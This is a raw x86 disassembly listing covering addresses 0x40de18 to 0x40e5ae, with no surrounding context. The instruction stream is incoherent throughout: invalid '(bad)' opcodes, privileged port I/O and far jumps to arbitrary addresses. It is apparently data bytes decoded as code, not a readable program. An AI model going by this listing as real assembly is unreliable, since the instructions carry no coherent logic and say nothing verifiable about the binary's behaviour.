  40de18:	mov    esi,DWORD PTR [ecx+0x6e6892cf]
  40de1e:	ins    DWORD PTR es:[edi],dx
  40de1f:	(bad)  
  40de20:	int    0x20
  40de22:	(bad)  
  40de24:	cmp    eax,0xfbea7e75
  40de29:	mov    edi,0x1640d211
  40de2e:	pop    ds
  40de2f:	mov    eax,0x2ace64d9
  40de34:	xchg   ebp,eax
  40de35:	jnp    0x40de7c
  40de37:	add    dh,ah
  40de39:	inc    ch
  40de3b:	inc    esp
  40de3c:	stos   DWORD PTR es:[edi],eax
  40de3d:	(bad)  
  40de3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de3f:	mov    edx,0x7146cdea
  40de44:	adc    edx,DWORD PTR [ebx-0x15d5928b]
  40de4a:	jb     0x40de1c
  40de4c:	(bad)  
  40de4d:	in     eax,dx
  40de4e:	cmp    al,0x86
  40de50:	xor    ecx,DWORD PTR [ecx-0x6ffce8cd]
  40de56:	retf   0xd5b6
  40de59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de5a:	int3   
  40de5b:	pop    esi
  40de5c:	mov    DWORD PTR [edi+0x5e],ebx
  40de5f:	push   edx
  40de60:	stc    
  40de61:	jbe    0x40de43
  40de63:	mov    esp,0x9a4ecfc6
  40de68:	push   edi
  40de69:	jge    0x40de03
  40de6b:	aas    
  40de6c:	pop    ds
  40de6d:	sbb    bh,dl
  40de6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de70:	mov    dh,0x4
  40de72:	retf   0xfcc9
  40de75:	mov    dh,0x90
  40de77:	nop
  40de78:	(bad)  
  40de79:	pop    ss
  40de7a:	mov    bh,0x4d
  40de7c:	jb     0x40de4b
  40de7e:	dec    ebp
  40de7f:	xor    DWORD PTR fs:[ebx-0x7e2fcd07],0xffffffd8
  40de87:	iret   
  40de88:	pop    ebx
  40de89:	ins    BYTE PTR es:[edi],dx
  40de8a:	std    
  40de8b:	shr    BYTE PTR [edi+0x43506199],cl
  40de91:	cmp    eax,0x5eddd9f
  40de96:	cmp    eax,0xb17a90f0
  40de9b:	imul   ebx,DWORD PTR [edi],0xffffff89
  40de9e:	mov    ds:0x4712e0c8,eax
  40dea3:	repnz out dx,al
  40dea5:	dec    ecx
  40dea6:	daa    
  40dea7:	fst    DWORD PTR [esi]
  40dea9:	je     0x40df02
  40deab:	icebp  
  40deac:	xchg   BYTE PTR [ebx],dh
  40deae:	(bad)  
  40deaf:	mov    cl,0x82
  40deb1:	and    DWORD PTR [esi+ecx*2+0x5],0xfffffff5
  40deb6:	int3   
  40deb7:	push   cs
  40deb8:	fbld   TBYTE PTR [edx-0x4eb575b8]
  40debe:	add    DWORD PTR [edi],edx
  40dec0:	scas   al,BYTE PTR es:[edi]
  40dec1:	jmp    0x46f19daa
  40dec6:	stos   BYTE PTR es:[edi],al
  40dec7:	jb     0x40de71
  40dec9:	xor    edx,DWORD PTR [ebp+0x3ec1667a]
  40decf:	fldcw  WORD PTR [edi+edi*8]
  40ded2:	sbb    al,0xb9
  40ded4:	jns    0x40dea8
  40ded6:	mov    edx,0x67e1f855
  40dedb:	cmc    
  40dedc:	int3   
  40dedd:	xor    al,0x92
  40dedf:	jl     0x40df29
  40dee1:	mov    bh,0xae
  40dee3:	shl    DWORD PTR [edx+0x3f],0x54
  40dee7:	xor    BYTE PTR [esi-0x58957768],0x7d
  40deee:	retf   0x6bc1
  40def1:	shr    BYTE PTR [ebp+0x7f],1
  40def4:	xchg   ecx,eax
  40def5:	dec    DWORD PTR [eax]
  40def7:	ja     0x40deb0
  40def9:	pop    eax
  40defa:	dec    ecx
  40defb:	ins    BYTE PTR es:[edi],dx
  40defc:	sbb    BYTE PTR [si-0x42c5],dl
  40df01:	jge    0x40df1a
  40df03:	mov    edx,?
  40df05:	mov    ecx,0xc5da4bc9
  40df0a:	cs scas al,BYTE PTR es:[edi]
  40df0c:	test   BYTE PTR [edx-0x3],dl
  40df0f:	dec    edx
  40df10:	xchg   dl,ah
  40df12:	shr    esp,cl
  40df14:	jae    0x40df7a
  40df16:	sbb    edi,eax
  40df18:	fsubr  st(2),st
  40df1a:	fcom   QWORD PTR [ebx]
  40df1c:	vdivps ymm5,ymm4,YMMWORD PTR [ecx-0x8]
  40df21:	imul   esp,DWORD PTR [ebx],0xdf007087
  40df27:	iret   
  40df28:	jp     0x40df38
  40df2a:	jae    0x40dec1
  40df2c:	les    edi,FWORD PTR [edx+0x48ae2f6]
  40df32:	lods   al,BYTE PTR ds:[esi]
  40df33:	jae    0x40ded6
  40df35:	sub    DWORD PTR [edi],esp
  40df37:	ret    0xf856
  40df3a:	xchg   esp,eax
  40df3b:	jne    0x40dedc
  40df3d:	xor    bl,BYTE PTR [edx]
  40df3f:	into   
  40df40:	in     al,dx
  40df41:	ret    
  40df42:	cwde   
  40df43:	loop   0x40dfb4
  40df45:	adc    eax,0x871d1321
  40df4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df4b:	arpl   di,cx
  40df4d:	aam    0xa2
  40df4f:	mov    ds:0x8c577e74,al
  40df54:	sbb    eax,0xa136338a
  40df59:	pop    edx
  40df5a:	out    dx,al
  40df5b:	jbe    0x40df05
  40df5d:	fadd   DWORD PTR gs:[ebx+0x54]
  40df61:	je     0x40df0e
  40df63:	out    0xb4,eax
  40df65:	cli    
  40df66:	test   BYTE PTR [ebx],dh
  40df68:	or     ah,BYTE PTR [eax-0x3cca959c]
  40df6e:	mov    eax,ds:0x539d0680
  40df73:	mov    esi,0x39354fca
  40df78:	les    ebp,FWORD PTR [edx+0x5719b7a8]
  40df7e:	add    al,0x2a
  40df80:	jp     0x40df4a
  40df82:	add    ebx,DWORD PTR [ecx]
  40df84:	xchg   esp,eax
  40df85:	lds    ebp,FWORD PTR [esi-0x70]
  40df88:	mov    bl,0x3e
  40df8a:	retf   
  40df8b:	stc    
  40df8c:	dec    ecx
  40df8d:	ret    
  40df8e:	sti    
  40df8f:	(bad)  
  40df91:	mov    edx,0x5511b5a9
  40df96:	jb     0x40df77
  40df98:	daa    
  40df99:	clc    
  40df9a:	cmp    DWORD PTR [edi+0x655f8baf],0x86582bc9
  40dfa4:	daa    
  40dfa5:	retf   0x8ae4
  40dfa8:	mov    esp,0x49c42837
  40dfad:	mov    ds:0x599487a3,al
  40dfb2:	mov    esi,0xe5b36e43
  40dfb7:	nop
  40dfb8:	fadd   DWORD PTR [esi+eiz*2+0x27]
  40dfbc:	test   dh,cl
  40dfbe:	pop    ebx
  40dfbf:	xchg   edi,eax
  40dfc0:	(bad)  
  40dfc1:	(bad)  
  40dfc3:	xchg   esp,eax
  40dfc4:	out    0x2e,al
  40dfc6:	(bad)  
  40dfc7:	and    BYTE PTR [ecx],bh
  40dfc9:	test   eax,0x8bc594dd
  40dfce:	arpl   WORD PTR [edi],bp
  40dfd0:	ror    DWORD PTR [eax+edi*2],cl
  40dfd3:	mov    ch,0x1b
  40dfd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfd6:	ret    
  40dfd7:	ficomp WORD PTR ds:0x66cc8265
  40dfdd:	mov    ds,WORD PTR [esi-0x215e11]
  40dfe3:	shr    BYTE PTR [ebp+0x1c],1
  40dfe6:	rcr    BYTE PTR [edx],cl
  40dfe8:	and    BYTE PTR [esi+eax*8],ah
  40dfeb:	(bad)  
  40dfec:	std    
  40dfed:	out    dx,eax
  40dfee:	test   DWORD PTR [edx-0x3902556f],ecx
  40dff4:	cmp    DWORD PTR [esi-0x4e],edx
  40dff7:	sbb    eax,0xd28984a2
  40dffc:	or     cl,bl
  40dffe:	mov    ecx,0x78904456
  40e003:	aad    0x93
  40e005:	adc    eax,DWORD PTR [esi-0x40a113ed]
  40e00b:	push   edx
  40e00c:	or     DWORD PTR [esi+eax*1-0x7d],0x9b769784
  40e014:	cld    
  40e015:	sbb    BYTE PTR [ecx+0x1089dbd7],0x6d
  40e01c:	adc    eax,0x13c87d19
  40e021:	add    DWORD PTR [edi-0x6a],esi
  40e024:	sbb    DWORD PTR [ecx+0x1ca0f5a1],esp
  40e02a:	xchg   ebp,eax
  40e02b:	cdq    
  40e02c:	lods   al,BYTE PTR ds:[esi]
  40e02d:	scas   al,BYTE PTR es:[edi]
  40e02e:	push   edi
  40e02f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e030:	jb     0x40dfee
  40e032:	js     0x40e03d
  40e034:	ficom  WORD PTR [edi-0x7d]
  40e037:	pop    ebp
  40e038:	sub    eax,0x692f29ed
  40e03d:	inc    ebp
  40e03e:	imul   ecx,DWORD PTR [edi-0x19],0x70749eea
  40e045:	lds    sp,DWORD PTR [eax+0x0]
  40e049:	lds    edi,FWORD PTR [ecx+0x478c40d]
  40e04f:	and    eax,0xa48147a6
  40e054:	in     eax,0x28
  40e056:	cvttps2pi mm0,QWORD PTR [ebp+0x56]
  40e05a:	cmp    eax,0x81ba9357
  40e05f:	into   
  40e060:	leave  
  40e061:	or     al,0x67
  40e063:	mov    WORD PTR [ecx+0x24027592],gs
  40e069:	jl     0x40e08c
  40e06b:	in     al,0x93
  40e06d:	sahf   
  40e06e:	jg     0x40e026
  40e070:	loope  0x40e038
  40e072:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e073:	dec    eax
  40e074:	(bad)  
  40e076:	mov    eax,0x4100c5bd
  40e07b:	mov    ds:0x57f22f16,eax
  40e080:	popf   
  40e081:	or     esp,DWORD PTR [ebx+0x1f80947f]
  40e087:	aad    0xf
  40e089:	dec    ecx
  40e08a:	pop    ds
  40e08b:	mov    al,0x82
  40e08d:	pop    edi
  40e08e:	ret    
  40e08f:	cli    
  40e090:	das    
  40e091:	and    DWORD PTR [edx+0x3097eea3],ebp
  40e097:	(bad)  
  40e098:	adc    ebx,esp
  40e09a:	adc    esp,eax
  40e09c:	or     BYTE PTR [ecx-0x7135480a],al
  40e0a2:	push   cs
  40e0a3:	es (bad) 
  40e0a5:	adc    esi,DWORD PTR [ecx+0xabd3981]
  40e0ab:	call   0xe856:0xe8f5870
  40e0b2:	inc    esi
  40e0b3:	or     al,0x81
  40e0b5:	out    dx,eax
  40e0b6:	jbe    0x40e094
  40e0b8:	sbb    BYTE PTR [esi-0x10],al
  40e0bb:	mov    ah,BYTE PTR [edi+0x52]
  40e0be:	fstp   QWORD PTR [edx-0x65]
  40e0c1:	mov    esp,DWORD PTR [edi+0x62]
  40e0c4:	aas    
  40e0c5:	imul   ebx,DWORD PTR [ebp+eiz*4+0x6f],0xcd4e426e
  40e0cd:	pop    esp
  40e0ce:	jmp    0xfcd12eb3
  40e0d3:	mov    ebp,0x2abe0a97
  40e0d8:	aad    0x99
  40e0da:	mov    edi,0x61f7c7e
  40e0df:	push   ecx
  40e0e0:	pop    es
  40e0e1:	push   es
  40e0e2:	aas    
  40e0e3:	push   ebp
  40e0e4:	loopne 0x40e0fc
  40e0e6:	or     eax,0x31d38241
  40e0eb:	bound  ebp,QWORD PTR [ebp-0x34]
  40e0ee:	repnz sbb al,0xf6
  40e0f1:	mov    cl,0xe6
  40e0f3:	jb     0x40e0c2
  40e0f5:	mov    BYTE PTR [esi+0x9],ah
  40e0f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0f9:	sbb    eax,DWORD PTR [ebx-0x71]
  40e0fc:	stos   BYTE PTR es:[edi],al
  40e0fd:	ds ja  0x40e15f
  40e100:	or     al,0x66
  40e102:	pop    ds
  40e103:	(bad)  
  40e104:	out    dx,eax
  40e105:	cmp    DWORD PTR [bx+di],ebp
  40e108:	add    al,0x56
  40e10a:	loop   0x40e12c
  40e10c:	and    eax,0xa843c696
  40e111:	cs sub al,0x21
  40e114:	aad    0x9f
  40e116:	js     0x40e132
  40e118:	mov    al,0x97
  40e11a:	cmp    al,0x3
  40e11c:	pop    esp
  40e11d:	pop    ss
  40e11e:	mov    DWORD PTR [ebp+0xb],edx
  40e121:	shl    DWORD PTR [edi+0x5a],0x96
  40e125:	mov    edi,0xe5668a8c
  40e12a:	xchg   ebp,eax
  40e12b:	in     eax,0x7a
  40e12d:	std    
  40e12e:	cwde   
  40e12f:	mov    bl,0x5b
  40e131:	in     al,0xce
  40e133:	aaa    
  40e134:	push   ecx
  40e135:	push   es
  40e136:	push   edi
  40e137:	ins    DWORD PTR es:[edi],dx
  40e138:	xor    al,0x6
  40e13a:	stc    
  40e13b:	lods   eax,DWORD PTR ds:[esi]
  40e13c:	xor    DWORD PTR [edx],ebx
  40e13e:	mov    eax,0x7905db63
  40e143:	pop    es
  40e144:	or     bh,BYTE PTR [ecx]
  40e146:	inc    ebx
  40e147:	and    BYTE PTR [edi-0xe6de043],cl
  40e14d:	gs add eax,0x6f49f910
  40e153:	daa    
  40e154:	adc    eax,0x65fa5ff7
  40e159:	cld    
  40e15a:	js     0x40e0f6
  40e15c:	sub    bl,BYTE PTR [ecx+0x62]
  40e15f:	push   0x4c
  40e161:	in     al,0x39
  40e163:	sbb    BYTE PTR [esi],cl
  40e165:	loopne 0x40e166
  40e167:	cwde   
  40e168:	in     al,dx
  40e169:	add    esi,edx
  40e16b:	ja     0x40e0fa
  40e16d:	add    DWORD PTR [ecx+ecx*4-0x55478847],esp
  40e174:	pop    esi
  40e175:	pop    ecx
  40e176:	push   ebx
  40e177:	cmc    
  40e178:	cmp    BYTE PTR [esi],cl
  40e17a:	pusha  
  40e17b:	and    eax,0x4165e42
  40e180:	sbb    DWORD PTR [esi-0x7f],0x0
  40e184:	sbb    eax,0x3ce37342
  40e189:	fdivr  DWORD PTR [esi]
  40e18b:	jae    0x40e15c
  40e18d:	ds inc edx
  40e18f:	sbb    edi,DWORD PTR [edi]
  40e191:	xor    eax,0x43bcedb
  40e196:	mov    ebx,0xa5d5942
  40e19b:	jp     0x40e120
  40e19d:	add    DWORD PTR [esi-0x3d],ecx
  40e1a0:	out    dx,al
  40e1a1:	out    0x2b,al
  40e1a3:	(bad)  [ebx]
  40e1a5:	imul   DWORD PTR ds:0x6a166bc1
  40e1ab:	enter  0x1c56,0x1f
  40e1af:	xor    esi,DWORD PTR [eax+edx*1+0x68c07d27]
  40e1b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1b7:	mov    ?,ecx
  40e1b9:	test   eax,0x8e5f67ab
  40e1be:	push   DWORD PTR [ecx+eiz*8+0x6db10954]
  40e1c5:	dec    ecx
  40e1c6:	xlat   BYTE PTR ds:[ebx]
  40e1c7:	add    al,0x5e
  40e1c9:	daa    
  40e1ca:	mov    bh,dh
  40e1cc:	int    0xdd
  40e1ce:	test   al,0x35
  40e1d0:	jmp    0x9594:0xcb67aed1
  40e1d7:	add    esi,DWORD PTR [ebp+0x74551bb6]
  40e1dd:	or     ebx,DWORD PTR [edi]
  40e1df:	call   0xb22a8759
  40e1e4:	pop    ss
  40e1e5:	repz mov es,WORD PTR [edx-0x4a10b223]
  40e1ec:	ins    DWORD PTR es:[edi],dx
  40e1ed:	pop    edi
  40e1ee:	cmp    DWORD PTR [edi+edx*8+0x46],ebp
  40e1f2:	pop    es
  40e1f3:	sbb    ebp,esp
  40e1f5:	popa   
  40e1f6:	int    0x9b
  40e1f8:	pop    ebp
  40e1f9:	sbb    DWORD PTR [ebx+0xa],edi
  40e1fc:	jp     0x40e1c6
  40e1fe:	pop    ecx
  40e1ff:	(bad)  
  40e200:	fnsave [ebp-0x34]
  40e203:	gs push ecx
  40e205:	mov    bh,0xd1
  40e207:	push   ecx
  40e208:	out    0x2f,eax
  40e20a:	pop    ebp
  40e20b:	jb     0x40e1a5
  40e20d:	xrelease mov DWORD PTR [ebp+0x7f942e20],esi
  40e214:	hlt    
  40e215:	aad    0xa9
  40e217:	repz xchg ebp,eax
  40e219:	in     al,0x2e
  40e21b:	xor    ebx,edx
  40e21d:	pop    eax
  40e21e:	data16 (bad) 
  40e220:	xlat   BYTE PTR ds:[ebx]
  40e221:	inc    edi
  40e222:	dec    eax
  40e223:	repnz pop ds
  40e225:	retf   
  40e226:	fnsave [ebx]
  40e228:	pop    edi
  40e229:	shr    DWORD PTR [edx+0x4c],1
  40e22c:	mov    ebx,0xe11350f3
  40e231:	inc    esp
  40e232:	sti    
  40e233:	xor    bl,cl
  40e235:	inc    esi
  40e236:	xor    al,0xd4
  40e238:	(bad)  
  40e239:	outs   dx,BYTE PTR ds:[esi]
  40e23a:	push   0xbc3f6532
  40e23f:	mov    ds:0xeae13c9e,eax
  40e244:	pop    ss
  40e245:	addr16 xor dl,bl
  40e248:	and    cl,BYTE PTR [edi+0x489ed2c6]
  40e24e:	xor    eax,ecx
  40e250:	(bad)  
  40e251:	enter  0xe9cd,0x5b
  40e255:	or     eax,0xe1cd04c5
  40e25a:	inc    esi
  40e25b:	sbb    edx,ebx
  40e25d:	push   es
  40e25e:	addr16 fwait
  40e260:	ss nop
  40e262:	mov    cs,ebp
  40e264:	push   ecx
  40e265:	xor    dl,al
  40e267:	ja     0x40e292
  40e269:	adc    al,0x70
  40e26b:	addr16 push ds
  40e26d:	imul   edx,esp,0xc0edc60f
  40e273:	cwde   
  40e274:	push   ss
  40e275:	or     DWORD PTR [ebx],ebp
  40e277:	fwait
  40e278:	in     eax,0xa5
  40e27a:	bound  edx,QWORD PTR [edx-0x7c]
  40e27d:	sub    edi,DWORD PTR ds:0xe61ea0ca
  40e283:	dec    ecx
  40e284:	addr16 xchg ebx,eax
  40e286:	cdq    
  40e287:	cmp    al,0x13
  40e289:	retf   0xf304
  40e28c:	push   esp
  40e28d:	mov    eax,0xfddf4c97
  40e292:	sub    DWORD PTR [eax+0x1d],esi
  40e295:	xchg   BYTE PTR [esp+eax*1-0x5f],bl
  40e299:	push   ss
  40e29a:	pop    ds
  40e29b:	pop    es
  40e29c:	fwait
  40e29d:	jo     0x40e245
  40e29f:	call   0xbc9e:0xace995b0
  40e2a6:	repz daa 
  40e2a8:	sub    eax,0x8a0fe76e
  40e2ad:	jo     0x40e2c2
  40e2af:	mov    esi,0x30a32f0c
  40e2b4:	(bad)  
  40e2b5:	sub    al,0x3d
  40e2b7:	inc    ebx
  40e2b8:	adc    BYTE PTR [ecx+0xd7687a3],ah
  40e2be:	push   edi
  40e2bf:	dec    eax
  40e2c0:	and    bh,BYTE PTR [esi+0x543e6b5b]
  40e2c6:	fidivr WORD PTR [ecx-0x43822c75]
  40e2cc:	(bad)  [edi+ebx*4+0x38]
  40e2d0:	push   sp
  40e2d2:	fs or  al,0x38
  40e2d5:	retf   0x24c8
  40e2d8:	jbe    0x40e28a
  40e2da:	pusha  
  40e2db:	cdq    
  40e2dc:	loopne 0x40e306
  40e2de:	add    eax,edi
  40e2e0:	cmp    BYTE PTR [edi+ecx*4-0x1870f16e],dh
  40e2e7:	imul   edx,DWORD PTR [eax],0x1f
  40e2ea:	rcl    BYTE PTR [ebx+0x28cdc799],0x68
  40e2f1:	and    DWORD PTR [ebx+0x432fde70],0x55eba45
  40e2fb:	cwde   
  40e2fc:	jbe    0x40e2cd
  40e2fe:	out    dx,al
  40e2ff:	ja     0x40e2f3
  40e301:	xchg   esi,eax
  40e302:	ror    BYTE PTR [edx+0x22],1
  40e305:	sahf   
  40e306:	mov    cl,0x59
  40e308:	sbb    ah,BYTE PTR [eax-0x611f927d]
  40e30e:	xchg   ebp,eax
  40e30f:	or     al,0xff
  40e311:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e312:	mov    al,ds:0xfd11c74d
  40e317:	cdq    
  40e318:	jp     0x40e2a0
  40e31a:	inc    ecx
  40e31b:	dec    eax
  40e31c:	dec    ebp
  40e31d:	stos   DWORD PTR es:[edi],eax
  40e31e:	add    eax,0xdbfb2e75
  40e323:	pop    esi
  40e324:	inc    eax
  40e325:	test   eax,0x3bff9e0c
  40e32a:	jne    0x40e38c
  40e32c:	inc    esp
  40e32d:	mov    esp,0x8334f5be
  40e332:	push   esi
  40e333:	fistp  WORD PTR ds:0xbce3296
  40e339:	cmp    ecx,eax
  40e33b:	or     al,0xc0
  40e33d:	cdq    
  40e33e:	stos   DWORD PTR es:[edi],eax
  40e33f:	test   eax,0x54b597a3
  40e344:	cmp    BYTE PTR [ebx+0x168d02f3],cl
  40e34a:	sub    al,BYTE PTR [esi+edx*1-0x72071fd0]
  40e351:	sbb    dl,BYTE PTR [edi+0x46]
  40e354:	adc    DWORD PTR [ebp+0x6c49b557],edi
  40e35a:	sti    
  40e35b:	retf   0x1d6e
  40e35e:	in     eax,0xd9
  40e360:	push   ebp
  40e361:	push   0x62d97a6b
  40e366:	stos   BYTE PTR es:[edi],al
  40e367:	call   0x59a0:0xffe86851
  40e36e:	push   edx
  40e36f:	cs hlt 
  40e371:	gs daa 
  40e373:	sbb    DWORD PTR [ebx-0x9],0x8f633392
  40e37a:	inc    ah
  40e37c:	fst    DWORD PTR ds:[esi]
  40e37f:	inc    ebp
  40e380:	aad    0x4e
  40e382:	add    bl,BYTE PTR [esi]
  40e384:	xchg   edi,eax
  40e385:	mov    edx,0xd92cb089
  40e38a:	dec    ebp
  40e38b:	mov    bh,0x16
  40e38d:	adc    al,0xaa
  40e38f:	cs arpl ax,di
  40e392:	or     BYTE PTR [esi+0x2d],al
  40e395:	fwait
  40e396:	aas    
  40e397:	xor    dl,BYTE PTR [eax-0x50]
  40e39a:	mov    ds:0xa07c6adf,al
  40e39f:	fist   DWORD PTR [eax-0x63]
  40e3a2:	adc    eax,0x99fddd20
  40e3a7:	popa   
  40e3a8:	mov    esi,0xdc285611
  40e3ad:	jno    0x40e3fa
  40e3af:	arpl   WORD PTR [esi-0x76],di
  40e3b2:	cdq    
  40e3b3:	sub    eax,DWORD PTR [ebx+0x7f]
  40e3b6:	jecxz  0x40e3bc
  40e3b8:	inc    ebp
  40e3b9:	adc    dh,BYTE PTR [ebp-0x7c]
  40e3bc:	mov    ebp,0x7ea65a5d
  40e3c1:	mov    dh,0xb9
  40e3c3:	mov    eax,ds:0xcab88ba9
  40e3c8:	push   cs
  40e3c9:	popa   
  40e3ca:	cmp    BYTE PTR [edi],ch
  40e3cc:	(bad)  
  40e3cd:	jl     0x40e352
  40e3cf:	and    edx,DWORD PTR [edx+0xf3e54fc]
  40e3d5:	jecxz  0x40e444
  40e3d7:	sar    BYTE PTR [edx+0x75],1
  40e3da:	xchg   esi,eax
  40e3db:	lea    ecx,[esi]
  40e3dd:	stos   BYTE PTR es:[edi],al
  40e3de:	pop    ebx
  40e3df:	daa    
  40e3e0:	sub    eax,0x618346e1
  40e3e5:	jmp    0xed3b:0x75e81afe
  40e3ec:	add    DWORD PTR [ecx],eax
  40e3ee:	neg    DWORD PTR [esi]
  40e3f0:	pop    ss
  40e3f1:	lods   eax,DWORD PTR ds:[esi]
  40e3f2:	das    
  40e3f3:	sbb    cl,bl
  40e3f5:	lock xor ch,0xba
  40e3f9:	lock mov ebp,0xbbc3d8d4
  40e3ff:	daa    
  40e400:	cmp    eax,0xa7212d56
  40e405:	adc    ecx,ebx
  40e407:	call   0xce24fa1c
  40e40c:	shr    DWORD PTR [ebx],1
  40e40e:	xor    ebx,DWORD PTR [edx]
  40e410:	ror    BYTE PTR [edx+0x7a864920],0xf2
  40e417:	retf   
  40e418:	loopne 0x40e40d
  40e41a:	loop   0x40e475
  40e41c:	xor    BYTE PTR [ecx],ch
  40e41e:	xchg   DWORD PTR [ebx-0x3c8fb6cb],esi
  40e424:	jge    0x40e45a
  40e426:	in     al,dx
  40e427:	lock xchg esp,eax
  40e429:	sbb    al,0x58
  40e42b:	fs (bad) 
  40e42d:	ins    BYTE PTR es:[edi],dx
  40e42e:	retf   
  40e42f:	scas   eax,DWORD PTR es:[edi]
  40e430:	imul   edi,DWORD PTR [ebp-0x1f],0x1b
  40e434:	jmp    0x97eba26a
  40e439:	dec    ecx
  40e43a:	sbb    esi,edx
  40e43c:	cmp    BYTE PTR [edi],bl
  40e43e:	add    edx,DWORD PTR [edi-0x4652dfec]
  40e444:	jbe    0x40e40e
  40e446:	es dec edx
  40e448:	fs (bad) 
  40e44b:	les    esp,FWORD PTR [esi]
  40e44d:	stos   DWORD PTR es:[edi],eax
  40e44e:	jae    0x40e3d1
  40e450:	jge    0x40e4a3
  40e452:	jnp    0x40e45c
  40e454:	in     al,dx
  40e455:	xchg   edi,eax
  40e456:	call   0x440c1b60
  40e45b:	pusha  
  40e45c:	outs   dx,BYTE PTR ds:[esi]
  40e45d:	jno    0x40e46c
  40e45f:	mov    edi,0xd5bebab6
  40e464:	push   esi
  40e465:	enter  0xe0c,0x17
  40e469:	push   esp
  40e46a:	div    BYTE PTR [esp+eiz*4]
  40e46d:	fwait
  40e46e:	sub    ebx,DWORD PTR [edx]
  40e470:	rcl    BYTE PTR [ecx-0x2902720d],cl
  40e476:	bound  ebp,QWORD PTR ds:0x73d4aee
  40e47c:	and    ecx,DWORD PTR [esi-0x46]
  40e47f:	gs and dh,bh
  40e482:	and    ebp,DWORD PTR [esi]
  40e484:	out    0xe4,eax
  40e486:	sti    
  40e487:	sub    DWORD PTR ds:0xe6f905b8,0xffffffaf
  40e48e:	mov    ebx,DWORD PTR [ebx-0x5a258b9d]
  40e494:	pop    es
  40e495:	dec    edx
  40e496:	in     al,dx
  40e497:	push   esi
  40e498:	push   eax
  40e499:	lahf   
  40e49a:	pop    esi
  40e49b:	loop   0x40e49f
  40e49d:	xchg   ecx,eax
  40e49e:	fwait
  40e49f:	clc    
  40e4a0:	push   edx
  40e4a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4a2:	sbb    eax,0xaa030401
  40e4a7:	shr    BYTE PTR [ebx+ecx*2],0x99
  40e4ab:	imul   ebx,DWORD PTR [edi+0x2671c181],0xe9eb9b60
  40e4b5:	(bad)  
  40e4b6:	repnz and dl,BYTE PTR [edx-0x5d1f477f]
  40e4bd:	cmp    dl,BYTE PTR [ebx-0x22]
  40e4c0:	scas   eax,DWORD PTR es:[edi]
  40e4c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4c2:	xchg   edx,eax
  40e4c3:	or     eax,0xf3753bc6
  40e4c8:	pop    ds
  40e4c9:	(bad)  
  40e4ca:	rol    bh,0x7a
  40e4cd:	in     eax,dx
  40e4ce:	sahf   
  40e4cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4d0:	ds jno 0x40e455
  40e4d3:	push   ss
  40e4d4:	sbb    eax,0x8a6791d4
  40e4d9:	sub    eax,0x8244cd56
  40e4de:	jg     0x40e47b
  40e4e0:	xchg   esp,eax
  40e4e1:	mov    eax,ds:0x5ac68a4d
  40e4e6:	addr16 out dx,al
  40e4e8:	and    eax,0x82f3b0bc
  40e4ed:	inc    edi
  40e4ee:	jecxz  0x40e51b
  40e4f0:	fisub  WORD PTR [eax-0x7]
  40e4f3:	lods   eax,DWORD PTR ds:[esi]
  40e4f4:	adc    DWORD PTR [ecx+0x74],ecx
  40e4f7:	and    esp,DWORD PTR ds:0x1c533897
  40e4fd:	fdiv   DWORD PTR [ebx+0x4a]
  40e500:	fisttp QWORD PTR [ebx-0x34a30f6f]
  40e506:	jge    0x40e4a2
  40e508:	and    BYTE PTR [ebp-0x44d6e751],cl
  40e50e:	mov    al,0xf
  40e510:	dec    ecx
  40e511:	pop    ebp
  40e512:	push   es
  40e513:	pop    ecx
  40e514:	fsub   QWORD PTR [esi+esi*1+0x53]
  40e518:	imul   BYTE PTR [ebp+0x2b5d3639]
  40e51e:	xchg   ebx,eax
  40e51f:	outs   dx,DWORD PTR ds:[esi]
  40e520:	repz sub DWORD PTR ss:[edi+0x34daa271],eax
  40e528:	pop    eax
  40e529:	loop   0x40e4e9
  40e52b:	inc    edx
  40e52c:	sbb    si,WORD PTR [esi+0x4a91e06c]
  40e533:	sahf   
  40e534:	add    DWORD PTR [edi+0x4fbbee29],0x1b
  40e53b:	jo     0x40e559
  40e53d:	push   esi
  40e53e:	mov    BYTE PTR [edi+0x43],ch
  40e541:	leave  
  40e542:	xchg   edi,eax
  40e543:	daa    
  40e544:	int    0xc2
  40e546:	ret    0x1380
  40e549:	sub    ch,dl
  40e54b:	add    DWORD PTR [esi+0x337eb893],ecx
  40e551:	jge    0x40e567
  40e553:	cmp    al,0x70
  40e555:	add    edi,0x20
  40e558:	add    eax,0xfc8a1e35
  40e55d:	push   ecx
  40e55e:	repz and BYTE PTR [ebp-0x76],dh
  40e562:	cld    
  40e563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e564:	jmp    0x7b7f4fe9
  40e569:	and    bh,BYTE PTR [edx]
  40e56b:	fcomp  QWORD PTR [ebx]
  40e56d:	jne    0x40e588
  40e56f:	into   
  40e570:	pop    esi
  40e571:	mov    edi,0xca4df829
  40e576:	inc    esp
  40e577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e578:	jle    0x40e504
  40e57a:	push   es
  40e57b:	mov    ch,0x43
  40e57d:	int3   
  40e57e:	stos   DWORD PTR es:[edi],eax
  40e57f:	inc    ecx
  40e580:	(bad)  
  40e581:	arpl   si,di
  40e583:	and    al,0x5f
  40e585:	mov    ch,0x79
  40e587:	mov    ecx,0xf5c3b2e4
  40e58c:	jns    0x40e550
  40e58e:	cmp    esp,DWORD PTR [edx-0x3ee50f86]
  40e594:	jb     0x40e5f5
  40e596:	inc    esi
  40e597:	add    eax,0x2d41a6f7
  40e59c:	mov    dl,0xa7
  40e59e:	outs   dx,DWORD PTR ds:[esi]
  40e59f:	sub    cl,BYTE PTR [ecx+0xe]
  40e5a2:	xchg   ecx,eax
  40e5a3:	pop    esp
  40e5a4:	dec    esi
  40e5a5:	rcl    DWORD PTR cs:[esi+0x3],cl
  40e5a9:	mov    ecx,0x3a134893
  40e5ae:	mov    fs,ebp
